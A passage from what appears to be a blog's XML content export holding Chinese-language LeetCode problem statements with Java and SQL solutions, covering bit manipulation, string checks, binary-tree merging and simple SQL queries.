<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">0</span> != xor) &#123;</span><br><span class="line">			count++;</span><br><span class="line">			xor = xor &amp; (xor - <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：异或位运算-移位"><a href="#解法四：异或位运算-移位" class="headerlink" title="解法四：异或位运算-移位"></a>解法四：异或位运算-移位</h3><p>为了计算等于 <code>1</code> 的位数，可以将每个位移动到最左侧或最右侧，然后检查该位是否为 <code>1</code>。</p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xor = x ^ y;</span><br><span class="line">    <span class="keyword">int</span> distance = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (xor != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (xor % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        distance += <span class="number">1</span>;</span><br><span class="line">      xor = xor &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> distance;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>476. 数字的补数</title>
    <url>/2018/08/29/LeetCode/leetcode-000476.%20%E6%95%B0%E5%AD%97%E7%9A%84%E8%A1%A5%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol>
<li>给定的整数保证在32位带符号整数的范围内。</li>
<li>你可以假定二进制数不包含前导零位。<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: 2</span><br><span class="line">解释: 5的二进制表示为101（没有前导零位），其补数为010。所以你需要输出2。</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 1</span><br><span class="line">输出: 0</span><br><span class="line">解释: 1的二进制表示为1（没有前导零位），其补数为0。所以你需要输出0。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>转换成二进制字符串，取反，再转换为整数</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findComplement</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        String sNum = Integer.toBinaryString(num);</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(flip(sNum), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">flip</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">'0'</span> == s.charAt(i)) &#123;</span><br><span class="line">				sb.append(<span class="string">'1'</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				sb.append(<span class="string">'0'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>520. 检测大写字母</title>
    <url>/2018/08/29/LeetCode/leetcode-000520.%20%E6%A3%80%E6%B5%8B%E5%A4%A7%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个单词，你需要判断单词的大写使用是否正确。</p>
<p>我们定义，在以下情况时，单词的大写用法是正确的：</p>
<ol>
<li>全部字母都是大写，比如”USA”。</li>
<li>单词中所有字母都不是大写，比如”leetcode”。</li>
<li>如果单词不只含有一个字母，只有首字母大写， 比如 “Google”。<br>否则，我们定义这个单词没有正确使用大写字母。<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;USA&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;FlaG&quot;</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h2><p>是由大写和小写拉丁字母组成的非空单词。</p>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>根据条件按个计算即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">detectCapitalUse</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        String upWord = word.toUpperCase();</span><br><span class="line">        <span class="keyword">if</span> (upWord.equals(word)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> c = word.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'A'</span> &lt;= c &amp;&amp; <span class="string">'Z'</span> &gt;= c) &#123;</span><br><span class="line">        	flag = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; word.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> cc = word.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (<span class="string">'a'</span> &lt;= cc &amp;&amp; <span class="string">'z'</span> &gt;= cc) &#123;</span><br><span class="line">        		low++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">'A'</span> &lt;= cc &amp;&amp; <span class="string">'Z'</span> &gt;= cc) &#123;</span><br><span class="line">        		up++;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (flag &amp;&amp; (low == word.length() - <span class="number">1</span> || <span class="number">0</span> == low)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flag &amp;&amp; up == word.length() - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!flag &amp;&amp; low == word.length() - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>575. 分糖果</title>
    <url>/2018/08/29/LeetCode/leetcode-000575.%20%E5%88%86%E7%B3%96%E6%9E%9C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个<strong>偶数</strong>长度的数组，其中不同的数字代表着不同种类的糖果，每一个数字代表一个糖果。你需要把这些糖果平均分给一个弟弟和一个妹妹。返回妹妹可以获得的最大糖果的种类数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,2,3,3]</span><br><span class="line">输出: 3</span><br><span class="line">解析: 一共有三种种类的糖果，每一种都有两个。</span><br><span class="line">     最优分配方案：妹妹获得[1,2,3],弟弟也获得[1,2,3]。这样使妹妹获得糖果的种类数最多。</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,3]</span><br><span class="line">输出: 2</span><br><span class="line">解析: 妹妹获得糖果[2,3],弟弟获得糖果[1,1]，妹妹有两种不同的糖果，弟弟只有一种。这样使得妹妹可以获得的糖果种类数最多。</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol>
<li>数组的长度为[2, 10,000]，并且确定为偶数。</li>
<li>数组中数字的大小在范围[-100,000, 100,000]内。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>计算除所有的糖果种类，如果所有糖果种类大于数据长度的二分之一，那么妹妹能获得的最大值就是二分之一的数组长度，否则就是所有的糖果种类数。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="keyword">int</span>[] candies)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;Integer&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : candies) &#123;</span><br><span class="line">        	result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (result.size() &gt; candies.length / <span class="number">2</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> candies.length / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	<span class="keyword">return</span> result.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>595. 大的国家</title>
    <url>/2018/08/29/LeetCode/leetcode-000595.%20%E5%A4%A7%E7%9A%84%E5%9B%BD%E5%AE%B6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>这里有张 <code>World</code> 表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| name            | continent  | area       | population   | gdp           |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      |</span><br><span class="line">| Albania         | Europe     | 28748      | 2831741      | 12960000      |</span><br><span class="line">| Algeria         | Africa     | 2381741    | 37100000     | 188681000     |</span><br><span class="line">| Andorra         | Europe     | 468        | 78115        | 3712000       |</span><br><span class="line">| Angola          | Africa     | 1246700    | 20609294     | 100990000     |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br></pre></td></tr></table></figure>
<p>如果一个国家的面积超过300万平方公里，或者人口超过2500万，那么这个国家就是大国家。</p>
<p>编写一个SQL查询，输出表中所有大国家的名称、人口和面积。</p>
<p>例如，根据上表，我们应该输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| name         | population  | area         |</span><br><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| Afghanistan  | 25500100    | 652230       |</span><br><span class="line">| Algeria      | 37100000    | 2381741      |</span><br><span class="line">+--------------+-------------+--------------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, population, area <span class="keyword">from</span> World <span class="keyword">where</span> population &gt; <span class="number">25000000</span> <span class="keyword">or</span> area &gt; <span class="number">3000000</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>620. 有趣的电影</title>
    <url>/2018/08/29/LeetCode/leetcode-000620.%20%E6%9C%89%E8%B6%A3%E7%9A%84%E7%94%B5%E5%BD%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>某城市开了一家新的电影院，吸引了很多人过来看电影。该电影院特别注意用户体验，专门有个 LED显示板做电影推荐，上面公布着影评和相关电影描述。</p>
<p>作为该电影院的信息部主管，您需要编写一个 SQL查询，找出所有影片描述为非 <code>boring</code> (不无聊) 的并且 <strong>id 为奇数</strong> 的影片，结果请按等级 <code>rating</code> 排列。<br>例如，下表 <code>cinema</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">|   2     | Science   |   fiction    |   8.5     |</span><br><span class="line">|   3     | irish     |   boring     |   6.2     |</span><br><span class="line">|   4     | Ice song  |   Fantacy    |   8.6     |</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure>
<p>对于上面的例子，则正确的输出是为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>无</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select * from cinema where description != <span class="string">'boring'</span> and id % <span class="number">2</span> = <span class="number">1</span> order by rating desc</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>627. 交换工资</title>
    <url>/2018/08/29/LeetCode/leetcode-000627.%20%E4%BA%A4%E6%8D%A2%E5%B7%A5%E8%B5%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>salary</code>表，如下所示，有m=男性 和 f=女性的值 。交换所有的 f 和 m 值(例如，将所有 f 值更改为 m，反之亦然)。要求使用一个更新查询，并且没有中间临时表。<br>例如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | m   | 2500   |</span><br><span class="line">| 2  | B    | f   | 1500   |</span><br><span class="line">| 3  | C    | m   | 5500   |</span><br><span class="line">| 4  | D    | f   | 500    |</span><br></pre></td></tr></table></figure>
<p>运行你所编写的查询语句之后，将会得到以下表:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | f   | 2500   |</span><br><span class="line">| 2  | B    | m   | 1500   |</span><br><span class="line">| 3  | C    | f   | 5500   |</span><br><span class="line">| 4  | D    | m   | 500    |</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>无</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">UPDATE</span> salary <span class="keyword">SET</span> sex  = (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> sex = <span class="string">'m'</span> <span class="keyword">THEN</span> <span class="string">'f'</span> <span class="keyword">ELSE</span> <span class="string">'m'</span> <span class="keyword">END</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>617. 合并二叉树</title>
    <url>/2018/08/29/LeetCode/leetcode-000617.%20%E5%90%88%E5%B9%B6%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。</p>
<p>你需要将他们合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则<code>不为</code> NULL 的节点将直接作为新二叉树的节点。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">	Tree 1                     Tree 2                  </span><br><span class="line">          1                         2                             </span><br><span class="line">         &#x2F; \                       &#x2F; \                            </span><br><span class="line">        3   2                     1   3                        </span><br><span class="line">       &#x2F;                           \   \                      </span><br><span class="line">      5                             4   7                  </span><br><span class="line">输出: </span><br><span class="line">合并后的树:</span><br><span class="line">	     3</span><br><span class="line">	    &#x2F; \</span><br><span class="line">	   4   5</span><br><span class="line">	  &#x2F; \   \ </span><br><span class="line">	 5   4   7</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>合并必须从两个树的根节点开始。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> != t1 &amp;&amp; <span class="keyword">null</span> != t2) &#123;</span><br><span class="line">			t1.val = t1.val + t2.val;</span><br><span class="line">			t1.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">			t1.right = mergeTrees(t1.right, t2.right);</span><br><span class="line">			<span class="keyword">return</span> t1;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> != t1 &amp;&amp; <span class="keyword">null</span> == t2) &#123;</span><br><span class="line">			<span class="keyword">return</span> t1;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> == t1 &amp;&amp; <span class="keyword">null</span> != t2) &#123;</span><br><span class="line">			<span class="keyword">return</span> t2;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>693. 交替位二进制数</title>
    <url>/2018/08/29/LeetCode/leetcode-000693.%20%E4%BA%A4%E6%9B%BF%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个正整数，检查他是否为交替位二进制数：换句话说，就是他的二进制数相邻的两个位数永不相等。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: True</span><br><span class="line">解释:</span><br><span class="line">5的二进制数是: 101</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 7</span><br><span class="line">输出: False</span><br><span class="line">解释:</span><br><span class="line">7的二进制数是: 111</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 11</span><br><span class="line">输出: False</span><br><span class="line">解释:</span><br><span class="line">11的二进制数是: 1011</span><br></pre></td></tr></table></figure>
<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: True</span><br><span class="line">解释:</span><br><span class="line">10的二进制数是: 1010</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将数字转换成二进制字符串，如果相邻的两位相等，则返回false，否则返回true。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasAlternatingBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        String s = Integer.toBinaryString(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length() - <span class="number">1</span>;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (s.charAt(i) == s.charAt(i + <span class="number">1</span>)) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>657. 判断路线成圈</title>
    <url>/2018/08/29/LeetCode/leetcode-000657.%20%E5%88%A4%E6%96%AD%E8%B7%AF%E7%BA%BF%E6%88%90%E5%9C%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>初始位置 (0, 0) 处有一个机器人。给出它的一系列动作，判断这个机器人的移动路线是否形成一个圆圈，换言之就是判断它是否会移回到<strong>原来的位置</strong>。</p>
<p>移动顺序由一个字符串表示。每一个动作都是由一个字符来表示的。机器人有效的动作有 <code>R</code>（右），<code>L</code>（左），<code>U</code>（上）和 <code>D</code>（下）。输出应为 true 或 false，表示机器人移动路线是否成圈。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;UD&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LL&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果机器人要回到原点的话，那么它水平方向上，向左和向右的次数，垂直方向上，向上和向下的次数，一定是一样的。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeCircle</span><span class="params">(String moves)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[][] position = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; moves.length();i++) &#123;</span><br><span class="line">			<span class="keyword">switch</span>(moves.charAt(i)) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'U'</span>:</span><br><span class="line">				position[<span class="number">0</span>][<span class="number">0</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">				position[<span class="number">0</span>][<span class="number">1</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">				position[<span class="number">1</span>][<span class="number">0</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'R'</span>:</span><br><span class="line">				position[<span class="number">1</span>][<span class="number">1</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (position[<span class="number">0</span>][<span class="number">0</span>] == position[<span class="number">0</span>][<span class="number">1</span>]) &amp;&amp; (position[<span class="number">1</span>][<span class="number">0</span>] == position[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>704. 二分查找</title>
    <url>/2018/08/29/LeetCode/leetcode-000704.%20%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
